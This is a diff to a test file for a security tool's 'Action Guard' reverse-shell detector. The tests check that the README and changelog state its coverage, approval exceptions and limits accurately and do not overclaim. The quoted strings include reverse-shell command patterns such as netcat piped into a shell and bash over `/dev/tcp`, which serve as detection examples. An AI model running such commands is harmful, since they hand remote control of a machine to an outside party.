@@ -493,13 +493,22 @@ describe('#1005 — the other surfaces know the signal', () => {
     for (const fact of [
       'Action Guard is off by default', '`reverse-shell` signal', 'dangerous approval tier', 'never a block',
       'never the catastrophic tier', 'four families', 'netcat', 'socat', '`/dev/tcp`', 'piped into netcat',
-      'Only a human answer releases it', 'An `actionGuard.autoApprove` entry never releases it', 'approval-broker pre-clear',
-      'watch-only advisory mode', 'a function body', '`case` arm', '`nc h 4444 | env sh`', 'not tap-eligible', 'fall back to a copy of the same pattern',
+      'An `actionGuard.autoApprove` entry never releases it', 'approval-broker pre-clear',
+      'watch-only advisory mode', 'a function body', '`case` arm', '`nc h 4444 | env sh`', 'fall back to a copy of the same pattern',
+      // #1088 r6 (Astra 1, 3): the human-only claim is scoped, its exceptions sit beside it, and the
+      // #815 tap is told apart from OpenClaw's own approval request.
+      'While the guard enforces in Claude Code or OpenClaw and there is an approver to ask, only a human answer releases it',
+      'The exceptions, where it can run with no human answer', 'the enforce-when-ready shadow',
+      'failure policy for high severity is `allow`', 'when the approver fails with an error',
+      "not eligible for ShieldCortex's one-tap phone approve (#815)", 'OpenClaw still raises its own approval request for it, and answering that is a human answer',
       'does not catch every one', 'not a complete defence', 'Not covered',
       // #1088 r5b (Jarvis N1, N2, N5): the named wrapper list, the further command-position gaps, `nc -c` on macOS/FreeBSD.
       '(only these, at any path', '`coproc`', '`3<>/dev/tcp/h/4444 bash <&3 >&3`', '`chroot`', '`toybox`', '`rbash`', '`busybox sh` as the pipe target',
       '`nc h 4444 | tee x | sh`', '`sh -i | busybox nc …`', '`sh -i | socat - tcp:…`', '`xargs … sh -c`', 'on OpenBSD it turns on TLS', '`nc -c h 25` asks too',
     ]) expect({ fact, present: para!.includes(fact) }).toEqual({ fact, present: true });
+    for (const gone of ['Only a human answer releases it', 'not tap-eligible', 'no phone card is offered', 'That holds while the guard enforces']) {
+      expect({ gone, present: para!.includes(gone) }).toEqual({ gone, present: false });
+    }
     for (const claim of [/\bprevents?\b/i, /\bevery reverse shell\b/i, /\bfully\b/i, /\bcomprehensive\b/i, /\bguarantee/i]) {
       expect({ claim: String(claim), present: claim.test(para!) }).toEqual({ claim: String(claim), present: false });
     }
@@ -509,9 +518,27 @@ describe('#1005 — the other surfaces know the signal', () => {
     const entry = fs.readFileSync(path.join(REPO, 'CHANGELOG.md'), 'utf-8').split('\n')
       .find((l) => l.startsWith('- **Action Guard asks before a reverse shell runs (#1005).**'));
     expect(entry).toBeDefined();
-    for (const gone of ['compound-command keywords', 'wrapper commands at any path']) expect({ gone, present: entry!.includes(gone) }).toEqual({ gone, present: false });
+    for (const gone of ['compound-command keywords', 'wrapper commands at any path', 'tap-approvable from a phone', 'While the guard enforces, only a human answer']) {
+      expect({ gone, present: entry!.includes(gone) }).toEqual({ gone, present: false });
+    }
     for (const fact of ['(only these, at any path', 'shell keywords such as `if`, `while` and `{`', '`coproc`', '`nc h 4444 | tee x | sh`',
-      '`3<>/dev/tcp/h/4444 bash <&3 >&3`', '`nc -c h 25` asks too', 'for this signal only']) expect({ fact, present: entry!.includes(fact) }).toEqual({ fact, present: true });
+      '`3<>/dev/tcp/h/4444 bash <&3 >&3`', '`nc -c h 25` asks too', 'for this signal only',
+      // #1088 r6: the same scoping, exceptions and #815 precision as the README.
+      'While the guard enforces in Claude Code or OpenClaw and there is an approver to ask, only a human answer releases it',
+      "not eligible for ShieldCortex's one-tap phone approve (#815)", 'OpenClaw still raises its own approval request for it',
+      'failure policy for high severity is `allow`', 'its approver fails with an error']) expect({ fact, present: entry!.includes(fact) }).toEqual({ fact, present: true });
+  });
+
+  // #1088 r6 (Astra 2, Grok): catastrophic has no approval door, and the reverse-shell exceptions are named.
+  it('the OpenClaw README autoApprove bullet keeps catastrophic apart from the human-answer ones', () => {
+    const bullet = fs.readFileSync(path.join(REPO, 'plugins/openclaw/README.md'), 'utf-8').split('\n')
+      .find((l) => l.startsWith('- `actionGuard.autoApprove`:'));
+    expect(bullet).toBeDefined();
+    expect(bullet!.includes('those need a human answer')).toBe(false);
+    for (const fact of ['a catastrophic operation (always refused, with no approval to give)',
+      "A write to the guard's own state or config always needs a human answer", 'A `reverse-shell` verdict needs one too, except',
+      'watch-only advisory (`enforce: false`)', 'the enforce-when-ready shadow', 'failure policy for high severity is `allow`',
+    ]) expect({ fact, present: bullet!.includes(fact) }).toEqual({ fact, present: true });
   });
 });
 
